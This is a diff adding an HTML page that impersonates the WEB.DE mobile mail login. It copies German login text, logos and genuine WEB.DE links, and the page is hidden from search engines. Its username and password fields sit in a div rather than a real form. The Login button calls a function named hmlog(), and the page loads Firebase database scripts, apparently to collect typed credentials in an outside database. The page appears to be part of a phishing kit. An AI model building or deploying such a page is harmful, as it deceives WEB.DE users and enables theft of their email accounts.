@@ -1,0 +1,137 @@
+<html lang="de" xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+  <title>
+    Mobile Login
+  </title>
+  <meta charset="UTF-8">
+  <meta name="description"
+    content="Mobiler Login ins WEB.DE Postfach: Hier können Sie sich mit dem Smartphone und Tablet schnell und sicher von unterwegs aus in Ihr WEB.DE Postfach einloggen.">
+  <meta name="robots" content="noindex">
+  <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="apple-itunes-app" content="app-id=368948250">
+  <!--Unhide passwort-->
+  <script type="text/javascript" id="globalJs" defer="defer" charset="UTF-8" src="js/uni_main.js"></script>
+  <link rel="stylesheet" type="text/css" href="css/uni_ver.css">
+</head>
+
+
+<body>
+  <div class="main-layout">
+
+
+
+    <div class="header ">
+      <div class="header__logo">
+        <img class="pos-svg icon icon--logo-mini_webde-dims icon--logo-webde-32-dims" src="images/top_logo.svg">
+      </div>
+      <div class="header__text">Mobile Login</div>
+    </div>
+
+
+    <div class="centered-content centered-content--narrow">
+
+
+      <div class="content-title">
+        <div class="content-title__logo">
+          <img class="pos-svg icon icon--logo-webde-56-dims icon--brand content-title__logo" src="images/main_logo.svg">
+        </div>
+        <h1>Login</h1>
+        <p id="loginText">
+          Bitte melden Sie sich hier mit Ihrem WEB.DE Nutzernamen und Ihrem Passwort an.
+        </p>
+      </div>
+
+
+
+      <div name="loginForm" accept-charset="UTF-8" data-formerror-check="serverchecked">
+
+        <div id="0:formPanel:loginForm:usernameInput">
+          <div class="pos-form-wrapper">
+            <label class="pos-label pos-label--block required"
+              for="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input">WEB.DE Nutzername</label>
+            <div class="pos-input">
+
+              <input id="hm-email" name="username" class="revealable-input-row__input" onkeypress="document.getElementsByClassName('pos-input')[0].classList.remove('pos-input--error');
+             document.getElementsByClassName('pos-form-message')[0].style.display='none'" value=""
+                id="0:formPanel:loginForm:usernameInput:topWrapper:inputWrapper:input" type="text"
+                data-webdriver-id="305a0d02a6e05838b4a635fd7f7fafd60241f53f">
+
+            </div>
+          </div>
+
+
+
+
+
+        </div>
+
+        <div id="0:formPanel:loginForm:passwordInput">
+          <div class="two-fa-enter-password">
+            <div class="pos-form-wrapper revealable-input-row">
+              <label class="pos-label pos-label--block required"
+                for="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input">Passwort eingeben</label>
+              <div class="pos-input">
+                <input id="hm-pass" type="password" class="revealable-input-row__input" required="required" onkeypress="document.getElementsByClassName('pos-input')[1].classList.remove('pos-input--error');
+                         document.getElementsByClassName('pos-form-message')[1].style.display='none'" value=""
+                  name="password" id="0:formPanel:loginForm:passwordInput:topWrapper:inputWrapper:input"
+                  data-webdriver-id="223d95a1e9849369ecaed565f7e751af81978ad9">
+                <div class="revealable-input-row__icon pos-input-icon">
+                  <img class="icon icon--password-eye-dims" src="images/eye.png">
+                </div>
+              </div>
+            </div>
+          </div>
+
+
+
+
+
+        </div>
+
+        <button onclick="hmlog()" id="submitButton" class="pos-button pos-button--cta pos-button--block a-mb-space-2">
+          Login
+        </button>
+      </div>
+
+
+
+      <a class="a-ta-c a-mb-space-3 pos-button pos-button--link pos-button--block" href="https://passwort.web.de/">
+        Passwort vergessen?
+      </a>
+      <hr class="centered-content__line-break a-mb-space-4">
+      <div class="a-ta-c a-mb-space-4">
+        <h2 class="a-mb-space-2.5">
+          Neu bei WEB.DE?
+        </h2>
+        <a class="pos-button pos-button--link pos-button--block"
+          href="https://registrierung.web.de/?isMobile=true#.pc_page.mm.login.textlink.registrierung">
+          Jetzt kostenlos registrieren!
+        </a>
+      </div>
+    </div>
+
+
+    <div class="footer">
+      <a class="footer__link" target="_blank" href="">Impressum</a>
+      <a class="footer__link" target="_blank" href="">Verträge hier kündigen</a>
+      <a class="footer__link" target="_blank" href="">AGB</a>
+      <a class="footer__link" target="_blank" href="">Datenschutz</a>
+    </div>
+
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+  <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
+
+  <script src="js/firebase.js">
+
+  </script>
+</body>
+
+</html>
